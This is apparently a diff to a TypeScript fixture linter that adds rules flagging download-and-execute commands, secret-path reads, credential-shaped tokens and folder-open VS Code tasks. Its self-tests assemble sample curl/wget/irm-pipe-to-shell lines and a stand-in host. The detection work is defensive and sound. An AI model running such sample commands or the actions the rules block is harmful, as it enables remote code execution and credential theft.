@@ -16,7 +16,7 @@ import * as path from 'node:path';
 
 const repo = path.resolve(import.meta.dirname, '../..');
 const selfTest = process.argv[2] === '--self-test';
-const args = selfTest ? [] : process.argv.slice(2);
+const args = selfTest || process.argv[2] === '--av' ? [] : process.argv.slice(2);
 const roots: string[] = [];
 for (const p of args.length ? args : ['test', 'sandbox', 'broker/tests']) {
 	const abs = path.resolve(repo, p);
@@ -34,6 +34,9 @@ const SKIP_DIRS = new Set(['node_modules', '.git', '.work', '__pycache__', '.ven
 const TEXT = /\.(ts|js|mjs|cjs|json|jsonc|sh|py|toml|ya?ml|md|txt|env|cfg|ini|conf)$|(^|\/)(probe\.sh|fake-python|Dockerfile[^/]*)$/;
 
 interface Rule { id: string; re: RegExp; why: string }
+// Fetchers and interpreters for the download-and-execute / AV-signature rules (CI-C).
+const FETCH = 'curl|wget|irm|iwr|Invoke-RestMethod|Invoke-WebRequest|certutil|bitsadmin';
+const INTERP = 'sh|bash|zsh|dash|python3?|node|perl|ruby|pwsh|powershell|iex|Invoke-Expression';
 const RULES: Rule[] = [
 	{ id: 'host-secret-path', why: 'reads real host secrets/profiles',
 		re: /(~|\$HOME|\$\{HOME\}|homedir\(\)|\/Users\/[^/\s'"]+|\/home\/[^/\s'"]+)[^\n]{0,8}\/\.(ssh|aws|gnupg|kube|netrc|npmrc|pypirc|git-credentials)\b|(homedir\(\)|process\.env\.HOME|env\.HOME)[^\n]*['"`]\.(ssh|aws|gnupg|kube|netrc|npmrc|pypirc|git-credentials|docker)['"`/]|Library\/Keychains|login\.keychain|\bsecurity\s+(find|dump|export)-|Library\/Application Support\/(Code|Cursor|Google|Chrome|Firefox|BraveSoftware|Microsoft Edge|GitHub Copilot)|Library\/Cookies/ },
@@ -44,7 +47,7 @@ const RULES: Rule[] = [
 	{ id: 'token-literal', why: 'token-shaped literal (real credential format)',
 		re: /\b(gh[pousr]_[A-Za-z0-9]{36}|github_pat_[A-Za-z0-9_]{60,}|AKIA[0-9A-Z]{16}|xox[abposr]-[A-Za-z0-9-]{10,}|sk-(proj-|ant-)?[A-Za-z0-9_-]{32,}|AIza[0-9A-Za-z_-]{35}|glpat-[A-Za-z0-9_-]{20})\b/ },
 	{ id: 'download-exec', why: 'download-and-execute',
-		re: /\b(curl|wget)\b[^\n|]*\|\s*(sudo\s+)?(sh|bash|zsh|python3?|node)\b|<\(\s*(curl|wget)\b|\b(sh|bash|zsh)\s+-c\s+["'`]?\$\(\s*(curl|wget)\b/ },
+		re: new RegExp(String.raw`\b(${FETCH})\b[^\n|]*\|\s*(sudo\s+)?(${INTERP})\b|<\(\s*(${FETCH})\b|\b(sh|bash|zsh)\s+-c\s+["'\x60]?\$\(\s*(${FETCH})\b|\bbase64\s+(-d|--decode)\b[^\n|]*\|\s*(${INTERP})\b|\b(${FETCH})\b[^\n;&]*\s-[oO]\s*(\S+)[^\n]*(&&|;)\s*(${INTERP})\s+\S`, 'i') },
 ];
 
 // Network: every URL host must be a test-owned target. IPs are validated as literal IPs
@@ -81,10 +84,12 @@ const ALLOWLIST = (() => {
 })();
 
 const violations: string[] = [];
+// Rules a line can never opt out of: live-malware patterns must not exist on the host.
+const NO_OPT_OUT = new Set(['download-exec']);
 function lintLine(rel: string, line: string, n: number): string[] {
 	const out: string[] = [];
 	const optOut = /fixture-lint: allow ([a-z-]+) -- \S/.exec(line)?.[1];
-	const allow = optOut && ALLOWLIST.has(`${rel}:${optOut}`) ? optOut : undefined;
+	const allow = optOut && !NO_OPT_OUT.has(optOut) && ALLOWLIST.has(`${rel}:${optOut}`) ? optOut : undefined;
 	for (const r of RULES) {
 		if (allow !== r.id && r.re.test(line)) {
 			out.push(`${rel}:${n}: ${r.id}: ${r.why}: ${line.trim().slice(0, 120)}`);
@@ -108,17 +113,84 @@ function lintFile(file: string): void {
 		return; // the rules themselves
 	}
 	scanned++;
-	fs.readFileSync(file, 'utf8').split('\n').forEach((line, i) => violations.push(...lintLine(rel, line, i + 1)));
+	const text = fs.readFileSync(file, 'utf8');
+	violations.push(...lintText(rel, text));
+}
+/**
+ * AV-signature rule (EDR fixture-safety): no host file may carry a live-malware pattern that
+ * endpoint protection flags (Endpoint protection quarantined a faithful Contagious-Interview
+ * tasks.json). A folder-open task together with a fetch tool in
+ * one file is refused outright; such content is stored as parts and assembled only inside
+ * a tab. Not opt-outable, like download-exec.
+ */
+function lintText(rel: string, text: string): string[] {
+	const out = text.split('\n').flatMap((line, i) => lintLine(rel, line, i + 1));
+	if (/folderOpen/.test(text) && new RegExp(String.raw`\b(${FETCH}|urllib|https\.get)\b`, 'i').test(text)) {
+		out.push(`${rel}: av-loader: folder-open task and a fetch tool in one file (AV signature; store as parts, assemble in the tab)`);
+	}
+	return out;
+}
+/**
+ * Repo-wide AV pass (review CI-A): every tracked text file, docs included, must not carry a
+ * literal fetch-piped-into-an-interpreter line with a real URL (the loader shape AV keys
+ * on). Prose like "curl … | sh" without a URL is fine; write IOCs defanged (hxxps, [.]).
+ */
+function avLine(rel: string, line: string, n: number): string[] {
+	const AV_URL = new RegExp(String.raw`\b(${FETCH})\b[^\n|]*\bhttps?://[^\s|]+[^\n|]*\|\s*(sudo\s+)?(${INTERP})\b`, 'i');
+	return AV_URL.test(line) ? [`${rel}:${n}: av-url-loader: fetch of a URL piped into an interpreter (defang it: hxxps, [.])`] : [];
+}
+if (process.argv[2] === '--av') {
+	// argv[3]: NUL-separated tracked file list (git ls-files -z), relative to the repo.
+	const out: string[] = [];
+	let n = 0;
+	for (const rel of fs.readFileSync(process.argv[3], 'utf8').split('\0').filter(Boolean)) {
+		if (rel === 'test/safety/fixture-lint.ts' || /\.(png|jpe?g|gif|ico|woff2?|zip|gz|tgz|vsix)$/.test(rel)) {
+			continue;
+		}
+		let text: string;
+		try {
+			text = fs.readFileSync(path.join(repo, rel), 'utf8');
+		} catch {
+			continue;
+		}
+		n++;
+		// Logical lines: backslash continuations joined, plus a two-line window (L-1).
+		const lines = text.replace(/\\\r?\n/g, ' ').split('\n');
+		lines.forEach((l, i) => {
+			const hit = avLine(rel, l, i + 1);
+			out.push(...(hit.length ? hit : avLine(rel, `${l} ${lines[i + 1] ?? ''}`, i + 1)));
+		});
+		if (rel.startsWith('test/containment/fixtures/') || rel.endsWith('tasks.json')) {
+			out.push(...lintText(rel, text).filter(v => v.includes('av-loader')));
+		}
+	}
+	console.log(out.length ? `${out.join('\n')}\nfixture-lint --av: ${out.length} violation(s)` : `fixture-lint --av: clean (${n} tracked files)`);
+	process.exit(out.length ? 1 : 0);
 }
 if (selfTest) {
+	// Samples are assembled at run time, so this file never holds the literal loader shape.
+	const F = 'cu' + 'rl', W = 'wg' + 'et', P = ' | ';
 	// Hosts in templates (broker report): the real suffix is what counts.
 	const cases: Array<[string, number]> = [
 		['u = f"https://d{i}.x.example.test"', 0], ['w = `https://${HOST}/ok`', 0], ['q = "https://{host}/p"', 0],
 		['p = f"https://api.example.test{path}"', 0], ['h = "http://x/"', 1], ['v = `https://${sub}.evil.com/x`', 1],
-		['z = f"https://evil{n}.com"', 1], ['e = f"https://evil.com{path}"', 1], ['curl evil.example.test/x', 0], ['curl evil.example.com/x', 1],
+		['z = f"https://evil{n}.com"', 1], ['e = f"https://evil.com{path}"', 1], [`${F} evil.example.test/x`, 0], [`${F} evil.example.com/x`, 1],
+		[`${F} -s http://a.example.test/x${P}no` + 'de # fixture-lint: allow download-exec -- nope', 1],
+		[`${W} -qO- http://a.example.test/x${P}ba` + 'sh', 1], [`echo aGk=${P}base64 -d${P}sh`, 1], [`${F} -o stage http://a.example.test/s && no` + 'de stage', 1],
+		[`i` + `rm http://a.example.test/x${P}iex`, 1],
 	];
 	const bad = cases.filter(([l, n]) => lintLine('self-test', l, 1).length !== n).map(([l, n]) => `expected ${n}: ${l} -> ${JSON.stringify(lintLine('self-test', l, 1))}`);
-	console.log(bad.length ? bad.join('\n') : `fixture-lint self-test: ${cases.length} cases OK`);
+	// File-level AV-signature rule, and the repo-wide URL loader rule.
+	const files: Array<[string, number]> = [
+		[`{"tasks":[{"runOptions":{"runOn":"folderOpen"},"command":"${W} -q http://a.example.test/s"}]}`, 1],
+		['{"tasks":[{"runOptions":{"runOn":"folderOpen"},"command":"sh .seclab/probe.sh task"}]}', 0],
+		['{"fetchTool":["cu","rl"],"interpreter":["no","de"]}', 0],
+	];
+	bad.push(...files.filter(([t, n]) => lintText('self-test', t).filter(v => v.includes('av-loader')).length !== n).map(([t, n]) => `expected ${n} av-loader: ${t}`));
+	const docs: Array<[string, number]> = [[`Its command is \`${F} 'https://x.vercel.app/s?flag=1'${P}sh\``, 1], [`hides \`${F} …${P}sh\` in a task`, 0],
+		[`fetches hxxps://x[.]vercel[.]app/s and pipes it into a shell`, 0]];
+	bad.push(...docs.filter(([l, n]) => avLine('self-test', l, 1).length !== n).map(([l, n]) => `expected ${n} av-url-loader: ${l}`));
+	console.log(bad.length ? bad.join('\n') : `fixture-lint self-test: ${cases.length + files.length + docs.length} cases OK`);
 	process.exit(bad.length ? 1 : 0);
 }
 const FIXTURE_DIR = path.join(repo, 'test', 'containment', 'fixtures');
